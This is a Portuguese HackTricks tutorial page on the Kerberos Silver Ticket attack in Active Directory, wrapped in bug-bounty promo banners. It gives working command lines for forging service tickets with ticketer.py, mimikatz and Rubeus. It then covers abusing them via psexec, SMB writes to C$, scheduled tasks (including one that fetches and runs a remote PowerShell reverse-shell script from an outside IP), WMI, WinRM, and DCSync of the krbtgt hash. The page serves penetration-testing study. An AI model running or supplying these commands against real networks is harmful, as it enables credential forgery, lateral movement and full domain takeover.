# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** na **Intigriti**, uma plataforma de **bug bounty premium criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

O ataque **Silver Ticket** envolve a exploração de tickets de serviço em ambientes Active Directory (AD). Este método depende de **adquirir o hash NTLM de uma conta de serviço**, como uma conta de computador, para forjar um ticket de Ticket Granting Service (TGS). Com este ticket forjado, um atacante pode acessar serviços específicos na rede, **impersonando qualquer usuário**, geralmente visando privilégios administrativos. É enfatizado que usar chaves AES para forjar tickets é mais seguro e menos detectável.

Para a criação de tickets, diferentes ferramentas são empregadas com base no sistema operacional:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### No Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços como HOST e RPCSS também podem ser explorados para tarefas e consultas WMI.

## Serviços Disponíveis

| Tipo de Serviço                            | Tickets de Serviço Silver                                                  |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode apenas pedir: WINRM</p> |
| Tarefas Agendadas                         | HOST                                                                       |
| Compartilhamento de Arquivos do Windows, também psexec | CIFS                                                                       |
| Operações LDAP, incluindo DCSync          | LDAP                                                                       |
| Ferramentas de Administração de Servidor Remoto do Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** você pode **pedir todos** esses tickets usando o parâmetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs de Evento de Tickets Silver

- 4624: Logon de Conta
- 4634: Logoff de Conta
- 4672: Logon de Admin

## Abusando de Tickets de Serviço

Nos exemplos a seguir, vamos imaginar que o ticket é recuperado impersonando a conta de administrador.

### CIFS

Com este ticket, você poderá acessar a pasta `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto apenas fazendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Com essa permissão, você pode gerar tarefas agendadas em computadores remotos e executar comandos arbitrários:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Com esses tickets, você pode **executar WMI no sistema da vítima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encontre **mais informações sobre wmiexec** na seguinte página:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Com acesso winrm a um computador, você pode **acessá-lo** e até obter um PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Verifique a página a seguir para aprender **mais maneiras de se conectar a um host remoto usando winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Observe que **winrm deve estar ativo e ouvindo** no computador remoto para acessá-lo.

### LDAP

Com esse privilégio, você pode despejar o banco de dados do DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saiba mais sobre DCSync** na página a seguir:

## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
